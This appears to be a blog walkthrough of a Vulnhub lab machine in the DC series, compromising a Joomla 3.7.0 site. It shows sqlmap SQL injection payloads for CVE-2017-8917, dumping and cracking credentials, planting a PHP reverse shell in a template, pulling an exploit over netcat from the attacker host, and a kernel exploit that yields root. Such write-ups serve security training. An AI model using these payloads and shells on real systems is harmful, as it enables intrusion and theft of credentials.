---
layout: post
title: Vulnhub - DC&#58; 2
---

Here's a walkthrough for the third VM in the DC Vulnhub series. 

## Enumeration
After a quick `nmap 10.10.10.0/24` I find the box at 10.10.10.8 with port 80 open. An in depth scan reveals Joomla! CMS.
```
$ nmap -sC -sV -Pn 10.10.10.8
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home
MAC Address: 08:00:27:DF:AE:54 (Oracle VirtualBox virtual NIC)
```

The front page of the website tells us the following:
```
This time, there is only one flag, one entry point and no clues.
To get the flag, you'll obviously have to gain root privileges.
How you get to be root is up to you - and, obviously, the system.
Good luck - and I hope you enjoy this little challenge.  :-)
```

There's a login form on the main page, but let's see if `gobuster` can find anything interesting for us.

```
$ gobuster dir --url http://10.10.10.8 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.8
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/18 22:34:41 Starting gobuster
===============================================================
/images (Status: 301)
/templates (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/bin (Status: 301)
/plugins (Status: 301)
/includes (Status: 301)
/language (Status: 301)
/components (Status: 301)
/cache (Status: 301)
/libraries (Status: 301)
/tmp (Status: 301)
/layouts (Status: 301)
/administrator (Status: 301)
/cli (Status: 301)
/server-status (Status: 403)
===============================================================
2020/08/18 22:35:19 Finished
===============================================================
```
The only pages that had anything on them were `/server-status` and `/administrator`.

Forbidden: http://10.10.10.8/server-status
Admin panel: http://10.10.10.8/administrator/

A quick Google search takes me to [How to Quickly Know the Version of any Joomla Website](https://ioctopus.com/how-to-quickly-know-the-version-of-any-joomla-website). For any Joomla site version >= 1.6.0, go here: `/administrator/manifests/files/joomla.xml`.

http://10.10.10.8/administrator/manifests/files/joomla.xml : <version>3.7.0</version>

Searchsploit tells us of a SQL Injection vulnerability when we run `searchsploit joomla 3.7.0`. Let's give it a shot.

```
# Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html

# Vendor Homepage: https://www.joomla.org/

# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917


URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27



Using Sqlmap: 

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)
```

Using the `sqlmap` command, we find 5 databases.

```
$ sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
...
[23:31:09] [INFO] the back-end DBMS is MySQL
[23:31:09] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.1
[23:31:09] [INFO] fetching database names
[23:31:09] [INFO] retrieved: 'information_schema'
[23:31:09] [INFO] retrieved: 'joomladb'
[23:31:09] [INFO] retrieved: 'mysql'
[23:31:09] [INFO] retrieved: 'performance_schema'
[23:31:09] [INFO] retrieved: 'sys'
available databases [5]:
[*] information_schema
[*] joomladb
[*] mysql
[*] performance_schema
[*] sys
...
```
`joomladb` seems promising. We can use sqlmap to enumerate specific databases with the `-D` flag and look for tables therein with the `--tables` flag. 

```
$ sqlmap -u "http://10.10.10.8/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables
...
Database: joomladb
[76 tables]
...
```
We get 76 different tables, but some with interesting names are: `#__bsms_admin`, `#__user_keys`, and `#__users`. I think `#__users` will likely have some account info.

```
$ sqlmap -u "http://10.10.10.8/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" --columns
...
[23:43:30] [INFO] retrieved: id                                                                                                 
[23:43:30] [INFO] retrieved: name                                                                                               
[23:43:30] [INFO] retrieved: username                                                                                           
[23:43:31] [INFO] retrieved: email                                                                                              
[23:43:34] [INFO] retrieved: password                                                                                           
[23:44:06] [INFO] retrieved: params                                                                                             
                                                                                                                                
Database: joomladb
Table: #__users
[6 columns]
...
```
Using the following I accidentally found and cracked the password for user `debian-sys-maint`:
```
$ sqlmap -u "http://10.10.10.8/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" --users --passwords
...
[23:46:50] [INFO] cracked password 'squires' for user 'debian-sys-maint'                                                        
database management system users password hashes:                                                                               
[*] debian-sys-maint [1]:
    password hash: *BFD14C8A23EF160EED3D54E16D4F5311264D0963
    clear-text password: squires
[*] mysql.session [1]:
    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[*] mysql.sys [1]:
    password hash: *0640482736E7906211AEA47971B6C8478BA7DB4D
[*] root [1]:
    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
...
```
The command I actually wanted to use dumped the info from the `#__users` table:
```
$ sqlmap -u "http://10.10.10.8/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" -C name,password --dump
...
[23:49:41] [INFO] retrieved: 'admin'
[23:49:41] [INFO] retrieved: '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu'
```

I put the username and password into a file called `hash` in the format `john` expects, i.e. <user>:<hash>, and cracked the password.

```
$ echo 'admin:$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' > pass.hash
$ john pass.hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
...
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
snoopy           (admin)
```
Alright, `admin:snoopy` gets us into `/administrator`. Let's look through the plugins and templates to see if we can open a reverse shell. Navigate to `http://10.10.10.8/administrator/index.php?option=com_templates&view=template&id=503&file=L2luZGV4LnBocA%3D%3D` and you can edit `/index.php`; seems like a good place to open a reverse shell. Let's add pentestmonkey's php-reverse-shell to the script, changing the IP and port as needed.

## Gaining Access

We know about the `/templates` directory from our `gobuster` scan (also from robots.txt). The current template customization page says `Editing file "/index.php" in template "beez3".`. After running `nc -nlvp 1234` on the Attacker machine, navigate to http://10.10.10.8/templates/beez3/index.php to start the reverse shell.


## Privilege Escalation
```
$ whoami
www-data
```

Nothing immediately stands out from `$ find / -perm /4000 2>/dev/null`.  I checked `/home` and found a user `dc3` with sudoer history, but couldn't access anything. We can't run `sudo -l`. Maybe the kernel?

```
$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04 LTS
Release:	16.04
Codename:	xenial
$ uname -a
Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
```
We get 3 specific results for `searchsploit 4.4.0-21 ubuntu`, though two look nearly identical. I uploaded chocobo_root.c as a.txt to get past the template file filter. Sadly, the linux AF_PACKET race condition exploit for CVE-2016-8655 did not work:
```
$ gcc chocobo_root.c -o chocobo_root -lpthread
$ ./chocobo_root
linux AF_PACKET race condition exploit by rebel
[.] starting
[.] checking hardware
[-] system has less than 2 processor cores
```
Then, following `/usr/share/exploitdb/exploits/linux_x86-64/local/40049.c` I uploaded decr.c and pwn.c as decr.txt and pwn.txt respectively. In my shell, I `mv` them back to `.c` files.

```
$ mv decr.txt decr.c
$ mv pwn.txt pwn.c
$ gcc decr.c -m32 -O2 -o decr
$ gcc pwn.c -O2 -o pwn
pwn.c: In function 'privesc':
pwn.c:26:42: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
         commit_creds(prepare_kernel_cred((uint64_t)NULL));
                                          ^
$ ./decr
netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik
[-] No ip_tables module found! Quitting...
$ insmod /lib/modules/4.4.0-21-generic/kernel/net/ipv4/netfilter/ip_tables.ko
insmod: ERROR: could not insert module ip_tables.ko: Operation not permitted
```

Hmmm. Well, looks like we are probably out of luck on this. If anyone did manage to follow this direction and succed, please let me know! Since 

I think it may be time to widen our search. 
```
$ searchsploit Ubuntu 4.4.
...
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD)  | exploits/linux/local/39772.txt
...
```
This looks promising, and links us to https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip. Because I don't want to deal with uploading through templates anymore (though this would set off fewer alarms), I'm going to send the `exploit.tar` over `nc`. You could also use python's simple HTTP server.

```
root@kali:~# nc -nvlp 4444 < exploit.tar
www-data@DC-3:/var/www/html$ nc 10.10.10.6 4444 > exploit.tar
...
$ tar -xvf exploit.tar
ebpf_mapfd_doubleput_exploit/
ebpf_mapfd_doubleput_exploit/hello.c
ebpf_mapfd_doubleput_exploit/suidhelper.c
ebpf_mapfd_doubleput_exploit/compile.sh
ebpf_mapfd_doubleput_exploit/doubleput.c
$ cd ebpf*
$ pwd
/var/www/html/ebpf_mapfd_doubleput_exploit
$ ./compile.sh	
doubleput.c: In function 'make_setuid':
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^
$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
whoami
root
```
I checked the `/home/dc3/.sudo_as_admin_successful` file with my newfound powers and it was empty. Onto `/root`:
```
cat /root/*
 __        __   _ _   ____                   _ _ _ _ 
 \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
  \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |
   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)
                                                     

Congratulations are in order.  :-)

I hope you've enjoyed this challenge as I enjoyed making it.

If there are any ways that I can improve these little challenges,
please let me know.

As per usual, comments and complaints can be sent via Twitter to @DCAU7

Have a great day!!!!
```

I hope you learned something (like I always do in the process) and enjoyed my walkthrough.

Note: After finishing, I heard of `joomscan` which could've been useful early on. Check it out!
